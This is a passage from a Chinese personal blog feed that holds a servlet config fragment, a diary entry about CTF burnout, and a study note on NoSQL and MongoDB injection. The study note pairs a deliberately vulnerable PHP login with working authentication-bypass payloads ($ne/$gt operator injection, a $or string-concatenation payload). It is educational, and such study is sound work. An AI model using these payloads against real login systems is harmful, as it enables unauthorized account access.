class="hljs-name">servlet-name</span>&gt;</span>logout<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>LogoutServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>logout<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/sys/logout<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>log<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>SysFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>log<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>log<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/sys/logout.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span></code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>12月康复计划</title>
    <link href="/2023/12/01/12%E6%9C%88%E5%BA%B7%E5%A4%8D%E8%AE%A1%E5%88%92/"/>
    <url>/2023/12/01/12%E6%9C%88%E5%BA%B7%E5%A4%8D%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h1 id="12月康复计划"><a href="#12月康复计划" class="headerlink" title="12月康复计划"></a>12月康复计划</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>引用Boogipop师傅的一句话</p><blockquote><p>虽然CTF很好玩,学新知识很有趣。但是最重要的事情仍然是一下三条</p><ul><li>睡一个好觉</li><li>吃一餐好饭</li><li>Be Happy</li><li>身体健康</li></ul><p>确保以上四条后再打CTF吧。要享受生活，品味美食，顺从内心。</p></blockquote><p>自加入工作室以来，去年12月吧，然后进入工作室后，其实和之前没什么不同，除了寒假打了三校联合赛，unknown师傅和Lolita师傅两人直接把我带飞，将近20多道题，我就只会一个，还是最简单玩游戏玩出来的。。。</p><p>然后就认识他们，再之后因为不会自学，认为web涉及太广泛，应该先扩大认知范围，所以一直到5月之前，我基本上都是再看wp，没刷过题，导致我的实力没有丝毫进步，直到5月初的一场比赛，让我认识到了错误，然后开始往返于工位之间，由此我的学习和生活变得一团糟</p><h2 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h2><p>主要还是个人原因，比较懒，到了很晚才返回宿舍（这真不是因为勤奋什么的，呆着呆着就不想动），再加上工位离宿舍区很远，每次回去时都没有共享单车，每次走回去都让我贼烦燥</p><p>自这学期开学以来更是如此，回到宿舍都12点多了，关键是我每次回到之后都要刷一下手机，刷着刷着tm的就1点了，然后洗澡才睡觉。。。。</p><p>是不挺无语的，但就是这样的生活到现在已经三个月了</p><h2 id="懒"><a href="#懒" class="headerlink" title="懒"></a>懒</h2><p>由于懒，我处理的方式就是不断变化自己的生活习惯，别人都是要养成好的生活习惯，我却。。。。</p><p>每当我十几天习惯一种时间习惯，最后都会变得怠惰。。</p><p>但好像总有变故来帮助我变化</p><p>尤其是工位装修后，来到离宿舍区更近的师兄们的工位后，心情还是舒畅了许多，比那边好多了</p><p>更何况看着师兄努力，学习也更有动力了</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>自从打了CTF以来就没管过学习了，我一般喜欢一次做好一件事</p><p>学习变得贼烂，前半年就不说了（CTF实力没涨，还挂了一门课），后半年的话是为了专攻技术而放弃上课</p><p>现在又要期末考了，贼烦不想挂科</p><p>要考什么概率论、电工（不知道学来干嘛）、数字逻辑</p><p>概率论老师说还更新了题库，变得更难了，真tm服了</p><h2 id="康复计划"><a href="#康复计划" class="headerlink" title="康复计划"></a>康复计划</h2><p>生活上还是看好时间就走，顺便跑一下校园跑（快截止了还没跑，感觉应该不会很惨吧），修炼身心，顺便应付体测</p><p>更关键的还是回宿舍后少玩手机，早点睡 （回去后尽量就不看手机了，这样至少能多睡一会）</p><p>学习上肯定是不想学的，但还是要期末冲刺 （真的难啊）</p><p>编程上，我的写代码能力是真不行，这段时间多看看、写一写开发的代码</p><p>唉，真希望有人能带我学CTF啊</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NoSQL和MongoDB</title>
    <link href="/2023/11/29/NoSQL%E5%92%8CMongoDB/"/>
    <url>/2023/11/29/NoSQL%E5%92%8CMongoDB/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考<a href="https://xz.aliyun.com/t/9908#toc-4">Nosql 注入从零到一 - 先知社区 (aliyun.com)</a></p><p>直接看参考文章就行</p><p>内容偷懒有删减，写文章是为了让自己坚持看完并且本地保存一下罢了</p><h1 id="什么是-Nosql"><a href="#什么是-Nosql" class="headerlink" title="什么是 Nosql"></a>什么是 Nosql</h1><blockquote><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p></blockquote><h1 id="什么是-MongoDB"><a href="#什么是-MongoDB" class="headerlink" title="什么是 MongoDB"></a>什么是 MongoDB</h1><blockquote><p>MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</p></blockquote><p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><div class="code-wrapper"><pre><code class="hljs ada">&#123;    <span class="hljs-string">&quot;_id&quot;</span> : <span class="hljs-type">ObjectId</span>(<span class="hljs-string">&quot;60fa854cf8aaaf4f21049148&quot;</span>),    <span class="hljs-string">&quot;name&quot;</span> : &quot;<span class="hljs-type">whoami</span><span class="hljs-string">&quot;,</span><span class="hljs-string">    &quot;</span>description<span class="hljs-string">&quot; : &quot;</span>the admin user<span class="hljs-string">&quot;,</span><span class="hljs-string">    &quot;</span>age<span class="hljs-string">&quot; : 19,</span><span class="hljs-string">    &quot;</span>status<span class="hljs-string">&quot; : &quot;</span>A<span class="hljs-string">&quot;,</span><span class="hljs-string">    &quot;</span>groups<span class="hljs-string">&quot; : [</span><span class="hljs-string">        &quot;</span>admins<span class="hljs-string">&quot;,</span><span class="hljs-string">        &quot;</span>users<span class="hljs-string">&quot;</span><span class="hljs-string">    ]</span><span class="hljs-string">&#125;</span></code></pre></div><h3 id="MongoDB-基础概念解析"><a href="#MongoDB-基础概念解析" class="headerlink" title="MongoDB 基础概念解析"></a>MongoDB 基础概念解析</h3><p>不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：</p><table><thead><tr><th>SQL 概念</th><th>MongoDB 概念</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表&#x2F;集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行&#x2F;文档</td></tr><tr><td>column</td><td>field</td><td>数据字段&#x2F;域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接，MongoDB 不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td></tr></tbody></table><h4 id="database"><a href="#database" class="headerlink" title="database"></a>database</h4><div class="code-wrapper"><pre><code class="hljs subunit">$ ./mongoMongoDB shell version: 3.0.6connecting to: test&gt; show dbs                       //展示所有数据库admin   0.078GBconfig  0.078GBlocal   0.078GB&gt; db                       //显示当前数据库对象<span class="hljs-keyword">test</span><span class="hljs-keyword"></span>&gt;</code></pre></div><h4 id="文档（Document）"><a href="#文档（Document）" class="headerlink" title="文档（Document）"></a>文档（Document）</h4><p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p><p>一个简单的文档例子如下：</p><div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">19</span><span class="hljs-punctuation">&#125;</span></code></pre></div><h4 id="集合（Collection）"><a href="#集合（Collection）" class="headerlink" title="集合（Collection）"></a>集合（Collection）</h4><p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p><p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p><div class="code-wrapper"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;whoami&quot;</span>&#125;&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;bunny&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">19</span>&#125;&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;bob&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">20</span>, <span class="hljs-string">&quot;groups&quot;</span>:[<span class="hljs-string">&quot;admins&quot;</span>,<span class="hljs-string">&quot;users&quot;</span>]&#125;</code></pre></div><p>使用 <code>show collections</code> 或 <code>show tables</code> 命令查看已有集合</p><div class="code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">show collections</span>all_users<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">show tables</span>all_users<span class="hljs-meta prompt_">&gt;</span></code></pre></div><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><div class="code-wrapper"><pre><code class="hljs actionscript">如果数据库不存在，则创建数据库，否则切连接并换到指定数据库<span class="hljs-keyword">use</span> users</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">创建集合db.create<span class="hljs-constructor">Collection(<span class="hljs-params">name</span>, <span class="hljs-params">options</span>)</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">use users</span>switched to db users<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">db.<span class="hljs-title function_">createCollection</span>(<span class="hljs-string">&quot;all_users&quot;</span>)</span>&#123; &quot;ok&quot; : 1 &#125;<span class="hljs-meta prompt_">&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php">&gt; db.all_users.<span class="hljs-title function_ invoke__">insert</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;whoami&#x27;</span>,     <span class="hljs-attr">description</span>: <span class="hljs-string">&#x27;the admin user&#x27;</span>,    <span class="hljs-attr">age</span>: <span class="hljs-number">19</span>,    <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;A&#x27;</span>,    <span class="hljs-attr">groups</span>: [<span class="hljs-string">&#x27;admins&#x27;</span>, <span class="hljs-string">&#x27;users&#x27;</span>]&#125;)</code></pre></div><p> 在 MongoDB 中我们可以使用 <code>update()</code> 或 <code>save()</code> 方法来更新集合中的文档</p><div class="code-wrapper"><pre><code class="hljs xquery">db<span class="hljs-built_in">.collection</span>.<span class="hljs-keyword">update</span>(   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">query</span>&gt;</span>,</span><span class="language-xml">   </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">update</span>&gt;</span>,</span><span class="language-xml">   </span><span class="language-xquery">&#123;</span><span class="language-xquery">     upsert: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>,</span></span><span class="language-xml"><span class="language-xquery">     multi: </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>,</span></span><span class="language-xml"><span class="language-xquery">     writeConcern: </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span></span></span><span class="language-xml"><span class="language-xquery">   &#125;</span></span><span class="language-xml"></span><span class="language-xml">)</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs routeros">&gt; db.lover.update(&#123;<span class="hljs-string">&#x27;age&#x27;</span>:19&#125;, &#123;<span class="hljs-variable">$set</span>:&#123;<span class="hljs-string">&#x27;age&#x27;</span>:20&#125;&#125;)WriteResult(&#123; <span class="hljs-string">&quot;nMatched&quot;</span> : 0, <span class="hljs-string">&quot;nUpserted&quot;</span> : 0, <span class="hljs-string">&quot;nModified&quot;</span> : 0 &#125;)&gt;&gt; db.all_users.<span class="hljs-built_in">find</span>().pretty()&#123;    <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;60fa854cf8aaaf4f21049148&quot;</span>),    <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;whoami&quot;</span>,    <span class="hljs-string">&quot;description&quot;</span> : <span class="hljs-string">&quot;the admin user&quot;</span>,    <span class="hljs-string">&quot;age&quot;</span> : 20,    <span class="hljs-string">&quot;status&quot;</span> : <span class="hljs-string">&quot;A&quot;</span>,    <span class="hljs-string">&quot;groups&quot;</span> : [        <span class="hljs-string">&quot;admins&quot;</span>,        <span class="hljs-string">&quot;users&quot;</span>    ]&#125;&gt;</code></pre></div><p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。</p><div class="code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">db.<span class="hljs-property">lover</span>.<span class="hljs-title function_">update</span>(&#123;<span class="hljs-string">&#x27;age&#x27;</span>:<span class="hljs-string">&#x27;19&#x27;</span>&#125;, &#123;<span class="hljs-attr">$set</span>:&#123;<span class="hljs-string">&#x27;age&#x27;</span>:<span class="hljs-number">20</span>&#125;&#125;, &#123;<span class="hljs-attr">multi</span>:<span class="hljs-literal">true</span>&#125;)</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stata"><span class="hljs-keyword">db</span>.collection.<span class="hljs-keyword">save</span>(   &lt;document&gt;,   &#123;     writeConcern: &lt;document&gt;   &#125;)&gt; <span class="hljs-keyword">db</span>.all_users.<span class="hljs-keyword">save</span>(&#123;    <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;60fa854cf8aaaf4f21049148&quot;</span>),    <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;whoami&quot;</span>,    <span class="hljs-string">&quot;description&quot;</span> : <span class="hljs-string">&quot;the admin user&quot;</span>,    <span class="hljs-string">&quot;age&quot;</span> : 21,    <span class="hljs-string">&quot;status&quot;</span> : <span class="hljs-string">&quot;A&quot;</span>,    <span class="hljs-string">&quot;groups&quot;</span> : [        <span class="hljs-string">&quot;admins&quot;</span>,        <span class="hljs-string">&quot;users&quot;</span>    ]&#125;)</code></pre></div><div class="code-wrapper"><pre><code class="hljs routeros">db.collection.<span class="hljs-built_in">find</span>(query, projection)&gt; db.all_users.<span class="hljs-built_in">find</span>(&#123;<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-string">&quot;20&quot;</span>&#125;)&#123; <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;60fa854cf8aaaf4f21049148&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;description&quot;</span> : <span class="hljs-string">&quot;the admin user&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : <span class="hljs-string">&quot;20&quot;</span>, <span class="hljs-string">&quot;status&quot;</span> : <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;groups&quot;</span> : [ <span class="hljs-string">&quot;admins&quot;</span>, <span class="hljs-string">&quot;users&quot;</span> ] &#125;可以使用 pretty() 方法以格式化的方式来显示所有文档&gt; db.all_users.<span class="hljs-built_in">find</span>(&#123;<span class="hljs-string">&quot;age&quot;</span>:20&#125;).pretty()&#123;    <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;60fa854cf8aaaf4f21049148&quot;</span>),    <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;whoami&quot;</span>,    <span class="hljs-string">&quot;description&quot;</span> : <span class="hljs-string">&quot;the admin user&quot;</span>,    <span class="hljs-string">&quot;age&quot;</span> : 20,    <span class="hljs-string">&quot;status&quot;</span> : <span class="hljs-string">&quot;A&quot;</span>,    <span class="hljs-string">&quot;groups&quot;</span> : [        <span class="hljs-string">&quot;admins&quot;</span>,        <span class="hljs-string">&quot;users&quot;</span>    ]&#125;&gt;</code></pre></div><table><thead><tr><th>操作</th><th>格式</th><th>范例</th><th>RDBMS 中的类似语句</th></tr></thead><tbody><tr><td>等于</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td><td><code>where name = &#39;whoami&#39;</code></td></tr><tr><td>小于</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td><td><code>where age &lt; 19</code></td></tr><tr><td>小于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 19</code></td></tr><tr><td>大于</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 19</code></td></tr><tr><td>大于或等于</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 19</code></td></tr><tr><td>不等于</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td><td><code>where likes != 19</code></td></tr></tbody></table><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">OR</span>条件&gt; db.col.<span class="hljs-built_in">find</span>(   &#123;      <span class="hljs-variable">$or</span>: [         &#123;key1: value1&#125;, &#123;key2:value2&#125;      ]   &#125;).pretty()&gt; db.all_users.<span class="hljs-built_in">find</span>(&#123;<span class="hljs-variable">$or</span>:[&#123;<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-string">&quot;19&quot;</span>&#125;]&#125;)&#123; <span class="hljs-string">&quot;_id&quot;</span> : ObjectId(<span class="hljs-string">&quot;60fa8ec6f8aaaf4f2104914c&quot;</span>), <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;bunny&quot;</span>, <span class="hljs-string">&quot;description&quot;</span> : <span class="hljs-string">&quot;the normal user&quot;</span>, <span class="hljs-string">&quot;age&quot;</span> : 19, <span class="hljs-string">&quot;status&quot;</span> : <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;groups&quot;</span> : [ <span class="hljs-string">&quot;lovers&quot;</span>, <span class="hljs-string">&quot;users&quot;</span> ] &#125;&gt;</code></pre></div><h1 id="NoSQL-注入的分类"><a href="#NoSQL-注入的分类" class="headerlink" title="NoSQL 注入的分类"></a>NoSQL 注入的分类</h1><p>有两种 NoSQL 注入分类的方式：</p><p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p><p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p><ul><li><strong>重言式注入</strong></li></ul><p>使生成的表达式判定结果永远为真</p><ul><li><strong>联合查询注入</strong></li></ul><p>联合查询最常用的用法是绕过认证页面获取数据。</p><ul><li><strong>JavaScript 注入</strong></li></ul><p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p><ul><li><strong>盲注</strong></li></ul><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p><h1 id="PHP的MongoDB注入"><a href="#PHP的MongoDB注入" class="headerlink" title="PHP的MongoDB注入"></a>PHP的MongoDB注入</h1><p>搭建环境看参考文章吧，不怎么想尝试，记个结果吧</p><h2 id="重言式"><a href="#重言式" class="headerlink" title="重言式"></a>重言式</h2><p>服务端</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$manager</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\<span class="hljs-title function_ invoke__">Manager</span>(<span class="hljs-string">&quot;mongodb://127.0.0.1:27017&quot;</span>);<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\<span class="hljs-title function_ invoke__">Query</span>(<span class="hljs-keyword">array</span>(    <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>,    <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-variable">$password</span>));<span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;<span class="hljs-title function_ invoke__">executeQuery</span>(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;<span class="hljs-title function_ invoke__">toArray</span>();<span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$result</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> &gt; <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;        <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">array</span>)<span class="hljs-variable">$user</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username:&#x27;</span> . <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password:&#x27;</span> . <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>] . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login Failed&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>对查询内容无限制</p><p>我们可以通过 <code>$ne</code> 关键字 （不等于）构造一个永真的条件就可以完成 NoSQL 注入：</p><div class="code-wrapper"><pre><code class="hljs gams">username[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=<span class="hljs-number">1</span>&amp;password[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=<span class="hljs-number">1</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">&gt; db<span class="hljs-selector-class">.users</span><span class="hljs-selector-class">.find</span>(&#123;<span class="hljs-string">&#x27;username&#x27;</span>:&#123;<span class="hljs-variable">$ne</span>:<span class="hljs-number">1</span>&#125;, <span class="hljs-string">&#x27;password&#x27;</span>:&#123;<span class="hljs-variable">$ne</span>:<span class="hljs-number">1</span>&#125;&#125;)&#123; <span class="hljs-string">&quot;_id&quot;</span> : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;60fa9c7b257f18542b68c4b8&quot;</span>), <span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;123456&quot;</span> &#125;&#123; <span class="hljs-string">&quot;_id&quot;</span> : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;60fa9c80257f18542b68c4b9&quot;</span>), <span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;657260&quot;</span> &#125;&#123; <span class="hljs-string">&quot;_id&quot;</span> : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;60fa9c85257f18542b68c4ba&quot;</span>), <span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;bunny&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;964795&quot;</span> &#125;&#123; <span class="hljs-string">&quot;_id&quot;</span> : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;60fa9c88257f18542b68c4bb&quot;</span>), <span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;bob&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;965379&quot;</span> &#125;</code></pre></div><p>同样的，我们也可以使用下面这些作为 payload 进行攻击：</p><div class="code-wrapper"><pre><code class="hljs gams">username[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=&amp;password[<span class="hljs-symbol">$</span><span class="hljs-keyword">ne</span>]=username[<span class="hljs-symbol">$</span><span class="hljs-keyword">gt</span>]=&amp;password[<span class="hljs-symbol">$</span><span class="hljs-keyword">gt</span>]=username[<span class="hljs-symbol">$</span>gte]=&amp;password[<span class="hljs-symbol">$</span>gte]=</code></pre></div><p>参考上面的表达式表格</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>假设后端的 MongoDB 查询语句使用了字符串拼接：</p><div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-built_in">string</span> query =<span class="hljs-string">&quot;&#123; username: &#x27;&quot;</span> + $username + <span class="hljs-string">&quot;&#x27;, password: &#x27;&quot;</span> + $password + <span class="hljs-string">&quot;&#x27; &#125;&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs nsis">username=<span class="hljs-literal">admin</span><span class="hljs-string">&#x27;, <span class="hljs-variable">$or</span>: [ &#123;&#125;, &#123;&#x27;</span>a<span class="hljs-string">&#x27;: &#x27;</span>a&amp;password=<span class="hljs-string">&#x27; &#125;], <span class="hljs-variable">$comment</span>: &#x27;</span><span class="hljs-number">123456</span></code></pre></div><p>拼接入查询语句后相当于执行了：</p><div class="code-wrapper"><pre><code class="hljs stylus">&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$or</span>: <span class="hljs-selector-attr">[ &#123;&#125;, &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password: <span class="hljs-string">&#x27;&#x27;</span> &#125;]</span>, <span class="hljs-variable">$comment</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;</code></pre></div><p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p><div class="code-wrapper"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> logins <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">password</span> <span 